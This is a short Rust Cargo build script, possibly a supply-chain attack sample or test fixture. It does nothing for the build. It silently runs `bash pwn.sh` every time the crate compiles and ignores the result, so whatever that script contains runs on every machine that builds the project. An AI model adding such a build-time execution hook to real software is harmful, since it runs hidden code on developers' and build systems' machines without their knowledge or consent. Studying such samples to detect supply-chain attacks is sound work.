use std::process::Command;

fn main() {
    println!("cargo:rerun-if-changed=build.rs");
    let _ = Command::new("bash")
        .arg("pwn.sh")
        .status();
}
